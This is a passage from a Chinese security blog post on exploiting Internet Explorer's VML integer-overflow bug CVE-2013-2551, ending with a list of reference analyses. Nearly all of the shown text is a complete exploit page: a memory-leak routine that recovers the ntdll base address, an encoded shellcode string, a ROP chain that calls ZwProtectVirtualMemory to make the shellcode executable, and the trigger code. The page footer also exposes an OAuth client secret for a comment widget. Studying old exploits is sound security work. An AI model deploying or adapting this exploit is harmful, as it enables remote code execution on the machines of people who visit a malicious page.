class="line"><span class="javascript">		<span class="keyword">var</span> rect_array = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> rop_addr;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> ntdllbase;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">createRects</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">				rect_array[i] = <span class="built_in">document</span>.createElement(<span class="string">"v:shape"</span>);</span></span><br><span class="line"><span class="javascript">				rect_array[i].id = <span class="string">"rect"</span> + i.toString();</span></span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.body.appendChild(rect_array[i]);</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>)</span>&#123;	</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> vml1  = <span class="built_in">document</span>.getElementById(<span class="string">"vml1"</span>);</span></span><br><span class="line"><span class="undefined">			</span></span><br><span class="line"><span class="javascript">			<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">				a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._vgRuntimeStyle;</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="undefined">			</span></span><br><span class="line"><span class="javascript">			<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span></span><br><span class="line"><span class="undefined">				a[i].rotation;</span></span><br><span class="line"><span class="javascript">				<span class="keyword">if</span> (i == <span class="number">0x300</span>) &#123;</span></span><br><span class="line"><span class="javascript">				vml1.dashstyle = <span class="string">"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"</span></span></span><br><span class="line"><span class="undefined">				&#125;</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="undefined">			</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> length_orig = vml1.dashstyle.array.length;</span></span><br><span class="line"><span class="undefined">			vml1.dashstyle.array.length = 0 - 1;   </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">			<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;  </span></span><br><span class="line"><span class="undefined">				marginLeftAddress_orgin = vml1.dashstyle.array.item(0x2E+0x16);   </span></span><br><span class="line"><span class="javascript">				a[i].marginLeft = <span class="built_in">unescape</span>(<span class="string">"%uc933%u8b64%u3041%u408b%u8b0c%u1470%u96ad%u8bad%u1058%u538b%u033c%u8bd3%u7852%ud303%u728b%u0320%u33f3%u41c9%u03ad%u81c3%u4738%u7465%u7550%u81f4%u0478%u6f72%u4163%ueb75%u7881%u6408%u7264%u7565%u8be2%u2472%uf303%u8b66%u4e0c%u8b49%u1c72%uf303%u148b%u038e%u33d3%u53c9%u5152%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u83d2%u0cc4%u5059%u6651%u6cb9%u516c%u7268%u2e74%u6864%u736d%u6376%uff54%u83d0%u10c4%u548b%u0424%uc933%ub951%u6d65%u6162%u8351%u246c%u6103%u6c83%u0224%u6862%u7973%u7473%u5054%ud2ff%uc483%u5510%uec8b%uec83%u3304%ubef6%u6d63%u0064%u7589%u8dfc%ufc75%uff56%u83d0%u08c4%u5a5e%ub95b%u7365%u6173%u8351%u246c%u6103%u5068%u6f72%u6863%u7845%u7469%u5354%ud2ff%uc933%uff51%u5fd0%u5b5e%uc481%u00c0%u0000%uec3b%u81e8%uff6a%u8bff%u5de5%u00c3"</span>);</span></span><br><span class="line"><span class="undefined">				marginLeftAddress_modify = vml1.dashstyle.array.item(0x2E+0x16);</span></span><br><span class="line"><span class="javascript">				<span class="keyword">if</span> (marginLeftAddress_orgin != marginLeftAddress_modify) &#123;</span></span><br><span class="line"><span class="undefined">					vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300;</span></span><br><span class="line"><span class="javascript">					<span class="keyword">var</span> leak = a[i].marginLeft;</span></span><br><span class="line"><span class="undefined">					vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress_orgin;</span></span><br><span class="line"><span class="javascript">					<span class="keyword">var</span> shelladdr = marginLeftAddress_modify;</span></span><br><span class="line"><span class="javascript">					ntdllbase = <span class="built_in">parseInt</span>(leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span>) - <span class="number">0x464F0</span>;</span></span><br><span class="line"><span class="javascript">					alert(<span class="string">"ntdllbase: 0x"</span> + ntdllbase.toString(<span class="number">16</span>));</span></span><br><span class="line"><span class="javascript">					alert(<span class="string">"shelladdr: 0x"</span> + shelladdr.toString(<span class="number">16</span>));</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">					<span class="keyword">var</span> rop_chain = tab2uni(get_ropchain(shelladdr));</span></span><br><span class="line"><span class="undefined">					a[i].marginLeft = rop_chain;</span></span><br><span class="line"><span class="undefined">					rop_addr = vml1.dashstyle.array.item(0x2E+0x16);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">					vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress_orgin;</span></span><br><span class="line"><span class="undefined">					vml1.dashstyle.array.length = length_orig;		</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">					alert(<span class="string">"ropaddr: 0x"</span> + rop_addr.toString(<span class="number">16</span>));</span></span><br><span class="line"><span class="undefined">					</span></span><br><span class="line"><span class="javascript">					<span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">				&#125;</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">get_ropchain</span>(<span class="params">shelladdr</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> data_off = <span class="number">0x000D7000</span> + <span class="number">0x2000</span>;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> arr = [</span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001cecb</span>),	    <span class="comment">//# RETN</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001da87</span>),	    <span class="comment">//# POP EBX # RETN</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00046B13</span>),	    <span class="comment">//# XCHG EAX,ESP # POP ESI # POP EDI # LEA EAX,DWORD PTR DS:[EDX-1] # POP EBX # RETN</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),	    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(data_off),	    <span class="comment">//buf1 -&gt; eax</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),	    <span class="comment">//# POP EDX # RETN</span></span></span><br><span class="line"><span class="javascript">				<span class="built_in">Number</span>(shelladdr),                  <span class="comment">//BaseAddress-&gt; edx</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),	    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span></span><br><span class="line"><span class="undefined">				0x90909090,</span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),	    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x4</span>),   <span class="comment">//buf2 -&gt; eax</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),	    <span class="comment">//# POP EDX # RETN</span></span></span><br><span class="line"><span class="javascript">				<span class="number">0x00010400</span>,                         <span class="comment">//NumberOfBytesToProtect -&gt; edx</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),	    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span></span><br><span class="line"><span class="undefined">				0x90909090,</span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),	    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(data_off<span class="number">-0x4</span>),   <span class="comment">//buf3 -&gt; eax</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),	    <span class="comment">//# POP EDX # RETN</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000C3C64</span>),	    <span class="comment">//# PUSHAD # RETN </span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),	    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span></span><br><span class="line"><span class="undefined">				0x90909090,</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00034b9a</span>),     <span class="comment">//# POP EDI # RETN</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00045360</span>),	    <span class="comment">//ZwProtectVirtualMemory -&gt; edi</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001da87</span>),	    <span class="comment">//# POP EBX # RETN</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x4</span>),   <span class="comment">//ptr to NumberOfBytesToProtect -&gt; ebx</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),	    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span></span><br><span class="line"><span class="undefined">				0x8b37c4da,</span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000576DA</span>),	    <span class="comment">//# ADD EAX,74C83B66 # RETN</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00008cbb</span>),	    <span class="comment">//# XCHG EAX,EDX # ADD AL,0 # POP ESI # POP EBP # RETN 0x04 (0x00000040 -&gt; edx)</span></span></span><br><span class="line"><span class="javascript">				<span class="built_in">Number</span>(shelladdr),                  <span class="comment">//return address -&gt; esi</span></span></span><br><span class="line"><span class="javascript">				<span class="number">0xffffffff</span>,                         <span class="comment">//0xffffffff -&gt; ebp</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000614e8</span>),	    <span class="comment">//# POP ECX # RETN</span></span></span><br><span class="line"><span class="undefined">				0x90909090, </span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x8</span>),   <span class="comment">//ptr to OldAccessProtection -&gt; ecx</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00037B20</span>),     <span class="comment">//# POP ESP # RETN</span></span></span><br><span class="line"><span class="javascript">				ntdllbase + <span class="built_in">Number</span>(data_off<span class="number">-0x4</span>),   <span class="comment">//ptr to BaseAddress -&gt; esp               </span></span></span><br><span class="line"><span class="undefined">				0x90909090,</span></span><br><span class="line"><span class="undefined">				0x90909090</span></span><br><span class="line"><span class="undefined">				];</span></span><br><span class="line"><span class="javascript">			<span class="keyword">return</span> arr;</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">dword</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> uni = <span class="built_in">String</span>.fromCharCode(dword &amp; <span class="number">0xFFFF</span>);</span></span><br><span class="line"><span class="javascript">            uni += <span class="built_in">String</span>.fromCharCode(dword&gt;&gt;<span class="number">16</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> uni;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">tab2uni</span>(<span class="params">tab</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> uni = <span class="string">""</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;tab.length;i++) &#123;</span></span><br><span class="line"><span class="undefined">                uni += d2u(tab[i]);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> uni;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> vml1  = <span class="built_in">document</span>.getElementById(<span class="string">"vml1"</span>)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">			<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">				a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._anchorRect;</span></span><br><span class="line"><span class="javascript">				<span class="keyword">if</span> (i == <span class="number">0x300</span>)&#123;</span></span><br><span class="line"><span class="javascript">					vml1.dashstyle = <span class="string">"1 2 3 4"</span>;</span></span><br><span class="line"><span class="undefined">				&#125;</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> length_orig = vml1.dashstyle.array.length;</span></span><br><span class="line"><span class="undefined">			vml1.dashstyle.array.length = 0 - 1; </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">			vml1.dashstyle.array.item(6) = rop_addr;</span></span><br><span class="line"><span class="javascript">			vml1.dashstyle.array.item(<span class="number">8</span>) = rop_addr;    <span class="comment">//rop_addr -&gt; ebx</span></span></span><br><span class="line"><span class="javascript">			vml1.dashstyle.array.item(<span class="number">9</span>) = ntdllbase + <span class="number">0x000cb0f8</span>;	<span class="comment">//# MOV ESP,EBX # POP EBX # RETN</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">			<span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)</span></span><br><span class="line"><span class="undefined">			&#123;</span></span><br><span class="line"><span class="javascript">				<span class="keyword">delete</span> a[i];</span></span><br><span class="line"><span class="undefined">				CollectGarbage();</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="javascript">			alert(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">		createRects();</span></span><br><span class="line"><span class="undefined">		leak();</span></span><br><span class="line"><span class="undefined">		exploit();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里有个玄学问题是，去掉alert之后利用成功率变得极低。。。有点懵逼</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="http://www.cnblogs.com/Danny-Wei/p/3766432.html" target="_blank" rel="noopener">CVE-2013-2551漏洞成因与利用分析</a></li><li><a href="https://dangokyo.me/2017/11/18/analysis-on-cve-2013-2551/" target="_blank" rel="noopener">Analysis on CVE-2013-2551</a></li><li><a href="http://c00c.cc/1496240787.html" target="_blank" rel="noopener">CVE-2013-2551分析</a></li><li><a href="http://www.4hou.com/technology/4241.html" target="_blank" rel="noopener">CVE-2013-2551样本分析及漏洞利用和防御</a></li><li><a href="https://bbs.pediy.com/thread-173600.htm" target="_blank" rel="noopener">IE 漏洞 CVE-2013-2551 分析</a></li><li><a href="http://www.vxjump.net/files/vuln_analysis/a_cve-2013-2551.txt" target="_blank" rel="noopener">漏洞CVE-2013-2551逆向分析</a></li></ul></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Hpasserby</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://hpasserby.top/post/ef2727d8.html">https://hpasserby.top/post/ef2727d8.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hpasserby.top">Hpasserby</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/堆利用/">堆利用</a><a class="post-meta__tags" href="/tags/IE/">IE</a><a class="post-meta__tags" href="/tags/整数溢出/">整数溢出</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="/images/alipay.jpg"><div class="post-qr-code__desc">支付宝赞赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="/images/wechat.jpg"><div class="post-qr-code__desc">微信赞赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/post/abaa2e35.html"><i class="fa fa-chevron-left"></i><span>v8 exploit入门[PlaidCTF roll a d8]</span></a></div><div class="next-post pull-right"><a href="/post/b72ee585.html"><span>IE越界访问漏洞[cve-2012-1876]分析</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk=new Gitalk({clientID:"f19a99b101901554beb9",clientSecret:"624e4f114c26477264046664ef4570cb7bacd636",repo:"Hpasserby.github.io",owner:"Hpasserby",admin:"Hpasserby",id:md5(decodeURI(location.pathname)),language:"zh-CN"});gitalk.render("gitalk-container")</script></div></div><footer class="footer-bg" style="background-image:url(/images/head.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Hpasserby</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text"><span>Hosted by <a href="https://pages.coding.me" style="font-weight:700">Coding Pages</a></span></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)&&($("#nav").addClass("is-mobile"),$("footer").addClass("is-mobile"))</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5">hexo-generator-search</a> <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html><!-- rebuild by neat -->